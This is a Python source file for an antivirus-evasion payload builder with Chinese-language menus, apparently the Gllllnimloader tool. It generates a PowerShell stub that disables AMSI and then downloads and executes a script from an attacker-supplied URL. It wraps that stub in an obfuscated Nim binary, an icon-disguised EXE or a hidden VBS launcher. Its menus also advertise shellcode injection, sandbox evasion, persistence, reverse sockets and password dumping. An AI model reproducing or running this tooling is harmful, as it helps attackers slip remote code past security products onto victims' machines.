
import base64
from email.mime import base
from importlib.resources import path
import sys, os
from time import sleep


raw_stub = """
                      ___   _   _       _      ____
 |_ _| | \ | | ___ | |_   / ___|_ __ ___  ___ _ __
  | |  |  \| |/ _ \| __| | |  _| '__/ _ \/ _ \ '_ \
  | |  | |\  | (_) | |_  | |_| | | |  __/  __/ | | |
 |___| |_| \_|\___/ \__|  \____|_|  \___|\___|_| |_|

usage: loader.py [-h] [-p explorer.exe] [-m QueueUserAPC] [-nr] [-v] [-d] [-o Green.exe] file

基于syswhispers的shellcode加载器
positional arguments:
  file                  包含raw格式的shellcode格式文件

optional arguments:
  -h, --help            show this help message and exit
  -p explorer.exe, --process explorer.exe
                        注入的进程(默认: explorer.exe)
  -m QueueUserAPC, --method QueueUserAPC
                        shellcode注入模式(Options: ProcessHollow, QueueUserAPC, RemoteThreadContext,
                        RemoteThreadSuspended, CurrentThread) (默认: QueueUserAPC)
  -nr, --no-randomize   禁用系统调用名称随机化
  -v, --verbose         执行时启用调试消息
  -d, --dll-sandbox     通过加载的 DLL 枚举逃避沙箱
  -o Green.exe, --outfile Green.exe
                        编译文件名
"""

graphical = """
####    ##    ##  #######  ########     ######   ########  ######## ######## ##    ## 
 ##     ###   ## ##     ##    ##       ##    ##  ##     ## ##       ##       ###   ## 
 ##     ####  ## ##     ##    ##       ##        ##     ## ##       ##       ####  ## 
 ##     ## ## ## ##     ##    ##       ##   #### ########  ######   ######   ## ## ## 
 ##     ##  #### ##     ##    ##       ##    ##  ##   ##   ##       ##       ##  #### 
 ##     ##   ### ##     ##    ##       ##    ##  ##    ##  ##       ##       ##   ### 
####    ##    ##  #######     ##        ######   ##     ## ######## ######## ##    ## 

"""
Option_stub = """
.------..------..------..------.     .------..------..------..------..------..------..------.
|M.--. ||O.--. ||R.--. ||E.--. |.-.  |O.--. ||P.--. ||T.--. ||I.--. ||O.--. ||N.--. ||S.--. |
| (\/) || :/\: || :(): || (\/) ((5)) | :/\: || :/\: || :/\: || (\/) || :/\: || :(): || :/\: |
| :\/: || :\/: || ()() || :\/: |'-.-.| :\/: || (__) || (__) || :\/: || :\/: || ()() || :\/: |
| '--'M|| '--'O|| '--'R|| '--'E| ((1)) '--'O|| '--'P|| '--'T|| '--'I|| '--'O|| '--'N|| '--'S|
`------'`------'`------'`------'  '-'`------'`------'`------'`------'`------'`------'`------'
 bilibli:我不是格林
 Github:https://github.com/INotGreen/Gllllnimloader
 
 1.免杀加载器(Bypass Loader)
 2.文件格式转换(File Format Conversion)
 3.权限维持(Backdoor Persistence)
 4.远程反射dll(Invoke-ReflectivePEInjection)
 5.免杀套接字(Bypass Socket)
 6.密码抓取工具(Passwords Dumping Tools)
 7.shellcode加密解密(ShellCode EncryptionDecryptor)
 8.nim自动化宏嵌入(Nim Automation Macro Embedding)
"""
stub = """
import winim/clr
import base64
var Automation = load("System.Management.Automation")
var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
var runspace = @RunspaceFactory.CreateRunspace()
runspace.Open()
var pipeline = runspace.CreatePipeline()
let strdecode = decode("REPLACED")
pipeline.Commands.AddScript(strdecode)
pipeline.Invoke()
runspace.Close()
"""
PowerShell_stub = """
Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
"""
powershell_to_vbs = """

<#Add-Type -AssemblyName System.Windows.Forms
<#$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ 
    InitialDirectory = [Environment]::GetFolderPath('Desktop') 
    Filter = 'PS1 Scripts (*.ps1)|*.ps1'
}
$null = $FileBrowser.ShowDialog()

[System.Windows.MessageBox]::Show($FileBrowser.Filename)
$parent = Split-Path $FileBrowser.Filename -parent
[System.Windows.MessageBox]::Show($parent)
$child = $FileBrowser.SafeFileName#>

$text = [IO.File]::ReadAllText("stubps1tovbs.ps1")
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$encoded = [Convert]::ToBase64String($bytes)

New-Item  -Name "Green.vbs" -ItemType "file" -Value "Set objShell = CreateObject(""Wscript.Shell"")`nobjShell.Run(""powershell -sta -NoExit -WindowStyle Hidden -EncodedCommand """"$encoded""""""),vbhide"
"""
Loading_method = """
1.Automation的加载方式(无图标)
d8888          888                                    888    d8b                   
      d88888          888                                    888    Y8P                   
     d88P888          888                                    888                          
    d88P 888 888  888 888888  .d88b.  88888b.d88b.   8888b.  888888 888  .d88b.  88888b.  
   d88P  888 888  888 888    d88""88b 888 "888 "88b     "88b 888    888 d88""88b 888 "88b 
  d88P   888 888  888 888    888  888 888  888  888 .d888888 888    888 888  888 888  888 
 d8888888888 Y88b 888 Y88b.  Y88..88P 888  888  888 888  888 Y88b.  888 Y88..88P 888  888 
d88P     888  "Y88888  "Y888  "Y88P"  888  888  888 "Y888888  "Y888 888  "Y88P"  888  888 
               
2.PSTOEXE的加载方式(有图标)
8888888b.               88888888888           8888888888                            
888   Y88b                  888               888                                   
888    888                  888               888                                   
888   d88P .d8888b          888   .d88b.      8888888    888  888  .d88b.   .d8888b 
8888888P"  88K              888  d88""88b     888        `Y8bd8P' d8P  Y8b d88P"    
888        "Y8888b.         888  888  888     888          X88K   88888888 888      
888             X88         888  Y88..88P     888        .d8""8b. Y8b.     Y88b.    
888         88888P'         888   "Y88P"      8888888888 888  888  "Y8888   "Y8888P                                                                                                                                                                                                                                                   
"""

def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,verbose):
    
    #print(stub)
   

    while True:
        print(Option_stub)
        Options = input("<INOTGREEN>:")
        if Options == "1":
            while True:
                #print()
                print("请选择下列shellcode加载器:\n"
                      "1.C/C++ ShellCode(bin)\n"
                      "2.C# ShellCode loader\n"
                      "3.PowerShell Loader\n"
                      "4.Nim ShellCode Loader\n")
                Bypass_choice = input("<INOTGREEN>:")
                if Bypass_choice == "back":
                    break
                if Bypass_choice == "1":
                    print(raw_stub)
                    file = input("请输入raw格式的文件:\n"
                    "<INETGREEN>:")
                    
                    os.system("powershell python.exe .\loader.py .\{} -p explorer.exe".format(file))
                if Bypass_choice == "3":
                    while True:
                        print(graphical)
                        url = input("请输入网址：")        
                        PowerShell_stub = PowerShell_stub.replace("GREEN", url)
                        #print(PowerShell_stub)
                        PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
                        stub = stub.replace("REPLACED", PowerShell_stubEncryption)
                        print(Loading_method)
                
                        BypassAntivirus = input("请选择PowerShell的打包方式:\n"
                                                "<INOTGREEN>:")
                        if BypassAntivirus == "1":
                            print("[+] 启用详细消息")
                            writefile = open("stub.nim", "w")
                            writefile.write(stub)
                            writefile.close()
                            sleep(1)
                            print("[+] 将新存根保存到 stub.nim")
                            sleep(1)
                            print("[+] 编译新存根...")
                            try:                          
                                os.system("nim c --hints:off --warnings:off -d:danger -d:mingw -d:strip --opt:size --passc=-flto --passl=-flto --app:gui .\stub.nim")
                                os.system("del stub.nim")
                                print("[!]编译成功")
                            except:
                                print("编译失败")
                                pass
                            os.system("del stub.nim")
                        if BypassAntivirus == "2":
                            Icon = input("请输入icon格式图标路径:")
                            print("[+] 启用详细消息")
                            writefile = open("Stub.ps1", "w")
                            writefile.write(PowerShell_stub)
                            writefile.close()
                            sleep(1)
                            print("[+] 将新存根保存到 stub.ps1")
                            sleep(1)
                            print("[+] 编译新存根...")
                            os.system(
                                "powershell .\PSTOEXE.ps1 -inputFile 'Stub.ps1' -iconFile {} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(
                                    Icon))
                            os.system("del Stub.ps1")
                        if BypassAntivirus == "back":
                            break
                        else:
                            print("没有该选项请重新输入")
                            sleep(1)
                            pass
        if Options == "2":
            while True:
                print("1.ps1_to_vbs\n"
                  "2.exe_vbs\n"
                  "3.exe_hta\n"
                  "4.exe_ps1\n"
                  "5.ps1_to_exe")
                formatopions = input("<INOTGREEN>:")
                if formatopions == "1":
                    url = input("请输入网址：\n"
                    "<INOTGREEN>:")        
                    PowerShell_stub = PowerShell_stub.replace("GREEN", url)
                    #print(PowerShell_stub)
                    PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
                    stub = stub.replace("REPLACED", PowerShell_stubEncryption)
                    print("[+] 启用详细消息")
                    os.system("del Green.vbs")
                    writefile = open("stubps1tovbs.ps1", "w")
                    writefile.write(PowerShell_stub)
                    writefile.close()
                    Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
                    Ps1ToVbs.write(powershell_to_vbs)
                    Ps1ToVbs.close()
                    sleep(1)
                    print("[+] 将新存根保存到 stubps1tovbs.ps1.ps1")
                    sleep(1)
                    os.system("powershell .\Ps1ToVbs.ps1")
                    os.system("del Ps1ToVbs.ps1")
                    os.system("del stubps1tovbs.ps1")
                if formatopions == "5":
                    Path = input("请输入文件路径:\n"
                    "<INOTEGREE>:")
                    Icon = input("请输入图标路径:\n"
                    "<INOTGREEN>:")
                    os.system("powershell .\PSTOEXE.ps1 -inputFile '{}' -iconFile {} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(Path).format(Icon))
                if formatopions == "back":
                    print(Option_stub)
                    break
                else:
                    print("输入内容有错误，请重新输入")
                    pass
        #if Options == "3":
        #if Options == "4":   
        if Options == "5":
            while True:
                print("1.Powershell\n"
                "2.C# Socket\n"
                "5.Nim Lang\n"
                "4.python\n"
                "5.C++\n")
                socketchoice = input("请输入套接字选项\n"
                "<INOTGREEN>:")
                if socketchoice == "1":
                    ip = input("请输入IP地址(域名)\n"
                    "<INOTGREEN>:")
                    port = input("请输入回连端口\n"
                    "<INOTGREEN>:")
        #if Options == "6": 
        else:
            sleep(1.9)
            print(Option_stub)
main(powershell_to_vbs, PowerShell_stub, stub, raw_stub,verbose=True)
















